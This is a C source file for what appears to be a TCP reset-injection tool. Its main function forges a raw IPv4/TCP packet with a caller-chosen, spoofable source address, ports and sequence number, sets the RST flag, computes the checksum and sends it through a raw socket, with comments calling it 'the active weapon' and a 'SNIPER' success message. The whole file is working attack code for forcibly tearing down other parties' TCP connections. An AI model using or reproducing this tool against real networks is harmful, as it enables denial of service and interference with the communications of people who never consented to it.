#include "main.h"

// The TCP Pseudo Header required for checksum calculation
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

// Standard Internet Checksum Algorithm
unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum = 0;
    unsigned short oddbyte;
    register short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return answer;
}

// The active weapon: Forges and fires a TCP RST packet
void fire_rst_packet(uint32_t src_ip, uint32_t dst_ip, uint16_t src_port, uint16_t dst_port, uint32_t seq_num) {
    // Create a raw socket
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s == -1) {
        perror("Failed to create raw socket (Are you running with sudo?)");
        return;
    }

    // Allocate memory for the packet (IP Header + TCP Header)
    char datagram[4096];
    memset(datagram, 0, 4096);

    struct ip *iph = (struct ip *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    // Target address configuration
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dst_port);
    sin.sin_addr.s_addr = dst_ip;

    // --- 1. Craft IPv4 Header ---
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 0;
    iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph->ip_id = htons(54321); // Arbitrary ID
    iph->ip_off = 0;
    iph->ip_ttl = 255;
    iph->ip_p = IPPROTO_TCP;
    iph->ip_sum = 0; // Kernel will fill this in for us
    iph->ip_src.s_addr = src_ip;
    iph->ip_dst.s_addr = dst_ip;

    // --- 2. Craft TCP Header ---
    tcph->th_sport = htons(src_port);
    tcph->th_dport = htons(dst_port);
    tcph->th_seq = htonl(seq_num);
    tcph->th_ack = 0;
    tcph->th_off = 5; // TCP header size
    tcph->th_flags = TH_RST; // Set the Reset Flag
    tcph->th_win = htons(0); // Window size 0 for RST
    tcph->th_sum = 0; 
    tcph->th_urp = 0;

    // --- 3. Calculate TCP Checksum ---
    psh.source_address = src_ip;
    psh.dest_address = dst_ip;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
    char *pseudogram = malloc(psize);
    memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));

    tcph->th_sum = csum((unsigned short *)pseudogram, psize);
    free(pseudogram);

    // --- 4. Tell Kernel we included the IP Header ---
    int one = 1;
    const int *val = &one;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        close(s);
        return;
    }

    // --- 5. FIRE! ---
    if (sendto(s, datagram, iph->ip_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0) {
        perror("RST Snipe Failed");
    } else {
        printf("\n[!!!] SNIPER: Forged RST Packet injected successfully.\n");
    }

    close(s);
}